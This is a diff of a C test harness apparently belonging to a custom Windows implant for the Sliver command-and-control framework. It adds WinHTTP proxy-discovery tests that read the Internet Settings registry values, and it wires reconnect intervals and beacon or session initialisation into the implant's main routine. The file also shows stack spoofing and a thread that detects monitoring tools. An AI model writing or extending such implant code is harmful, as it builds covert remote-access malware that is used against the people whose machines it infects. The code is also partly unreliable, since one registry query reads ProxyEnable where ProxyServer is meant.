@@ -694,13 +694,13 @@ void test37(void) {
 }
 
 void test38(void) {
-	CHAR szEncoded[] = "osqOP-fq_c2a3+bnqduYKLNOZPhd0Jfqw8tJw-VxrdRqLYZqb9u-r-FdqvWMLjPS4rwcSNOmfxG3WqcJDhyRn00oQ_GazB-mEaqFGK0aW8PM7oA0-LYlVknKUYiFMP9v7qi+754ThQk0ZtAPRoF0VJhLLWQy6e9_kzN5Eq31LZF7WumNoWIlx7kL0ISdyXHVWmhYsVGlcHt+l1NnyXj";
+	/*CHAR szEncoded[] = "osqOP-fq_c2a3+bnqduYKLNOZPhd0Jfqw8tJw-VxrdRqLYZqb9u-r-FdqvWMLjPS4rwcSNOmfxG3WqcJDhyRn00oQ_GazB-mEaqFGK0aW8PM7oA0-LYlVknKUYiFMP9v7qi+754ThQk0ZtAPRoF0VJhLLWQy6e9_kzN5Eq31LZF7WumNoWIlx7kL0ISdyXHVWmhYsVGlcHt+l1NnyXj";
 	DWORD cbOutput = 0;
 	PBYTE pOutput = NULL;
 
 	pOutput = SliverBase64Decode(szEncoded, &cbOutput);
 	HexDump(pOutput, cbOutput);
-	FREE(pOutput);
+	FREE(pOutput);*/
 }
 
 void test39(void) {
@@ -976,7 +976,7 @@ void test56(void) {
 }
 
 void test57(void) {
-	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
+	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
 	PBYTE pOutput = NULL;
 	DWORD cbOutput = 0;
 
@@ -984,7 +984,7 @@ void test57(void) {
 	pOutput = RegisterSliver(pSliverClient, &cbOutput);
 	HexDump(pOutput, cbOutput);
 	FREE(pOutput);
-	FreeSliverHttpClient(pSliverClient);
+	FreeSliverHttpClient(pSliverClient);*/
 }
 
 void test58(void) {
@@ -1680,6 +1680,88 @@ void test109(void) {
 	StackSpoofing(PrintFormatA, 5, "Hello %s, ID: %d, address: %p, hex value: 0x%08x", "Dat", 10, test109, 20);
 }
 
+void test110(void) {
+	HINTERNET hHttpSession = NULL;
+	HINTERNET hConnect = NULL;
+	HINTERNET hRequest = NULL;
+	WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions;
+	WINHTTP_PROXY_INFO ProxyInfo;
+	PDWORD pProxyEnable = NULL;
+	DWORD cbOutput = 0;
+	LPSTR lpProxyServer = NULL;
+	BOOL ProxyEnable = FALSE;
+
+	hHttpSession = WinHttpOpen(L"WinHTTP AutoProxy Sample/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	if (!hHttpSession) {
+		return;
+	}
+
+	hConnect = WinHttpConnect(hHttpSession, L"www.microsoft.com", INTERNET_DEFAULT_HTTP_PORT, 0);
+	if (!hConnect) {
+		return;
+	}
+
+	hRequest = WinHttpOpenRequest(hConnect, L"GET", L"ms.htm", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+	if (!hRequest) {
+		return;
+	}
+
+	SecureZeroMemory(&AutoProxyOptions, sizeof(AutoProxyOptions));
+	AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
+	AutoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
+	AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
+
+	SecureZeroMemory(&ProxyInfo, sizeof(ProxyInfo));
+	if (WinHttpGetProxyForUrl(hHttpSession, L"https://www.microsoft.com/ms.htm", &AutoProxyOptions, &ProxyInfo)) {
+		ProxyEnable = TRUE;
+	}
+	else {
+		if (QueryRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", L"ProxyEnable", &pProxyEnable, &cbOutput)) {
+			if (*pProxyEnable == 1) {
+				if (QueryRegValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", L"ProxyEnable", &lpProxyServer, &cbOutput)) {
+					SecureZeroMemory(&ProxyInfo, sizeof(ProxyInfo));
+					ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+					ProxyInfo.lpszProxy = ConvertCharToWchar(lpProxyServer);
+					ProxyEnable = TRUE;
+				}
+			}
+		}
+	}
+
+	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(ProxyInfo))) {
+		return;
+	}
+
+	if (pProxyEnable != NULL) {
+		FREE(pProxyEnable);
+	}
+
+	if (lpProxyServer != NULL) {
+		FREE(lpProxyServer);
+	}
+
+	if (AutoProxyOptions.lpszAutoConfigUrl != NULL) {
+		FREE(AutoProxyOptions.lpszAutoConfigUrl);
+	}
+}
+
+void test111(void)
+{
+	HINTERNET hHttpSession = NULL;
+	PWINHTTP_PROXY_INFO pProxyInfo = NULL;
+
+	hHttpSession = WinHttpOpen(L"WinHTTP AutoProxy Sample/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	if (!hHttpSession) {
+		return;
+	}
+
+	pProxyInfo = ResolveProxy(hHttpSession, L"www.microsoft.com");
+CLEANUP:
+	if (pProxyInfo != NULL) {
+		FREE(pProxyInfo);
+	}
+}
+
 VOID DetectMonitorSystem(VOID)
 {
 	while (TRUE) {
@@ -1703,10 +1785,12 @@ VOID Final(VOID)
 	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
 	DWORD dwPollInterval = 2;
 	DWORD dwMaxFailure = 5;
+	DWORD dwReconnectInterval = 600;
 	GLOBAL_CONFIG GlobalConfig;
 #ifdef __BEACON__
 	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
 #else
+	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 #endif
 
 	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DetectMonitorSystem, NULL, 0, &dwThreadId);
@@ -1724,11 +1808,14 @@ VOID Final(VOID)
 	lstrcpyA(GlobalConfig.szSliverName, szSliverClientName);
 	GlobalConfig.dwPollInterval = dwPollInterval;
 	GlobalConfig.dwMaxFailure = dwMaxFailure;
+	GlobalConfig.dwReconnectInterval = dwReconnectInterval;
 
 #ifdef __BEACON__
 	pBeaconClient = BeaconInit(&GlobalConfig);
-	BeaconMain(pBeaconClient);
+	BeaconMainLoop(pBeaconClient);
 #else
+	pSessionClient = SessionInit(&GlobalConfig);
+	//SessionMain()
 #endif
 CLEANUP:
 	if (hThread != NULL) {
@@ -1876,9 +1963,11 @@ int main(void) {
 	//test102();
 	//test103();
 	//test104();
-	test105();
+	//test105();
 	//test106();
 	//test108();
-	test109();
+	//test109();
+	//test110();
+	test111();
 	return 0;
 }
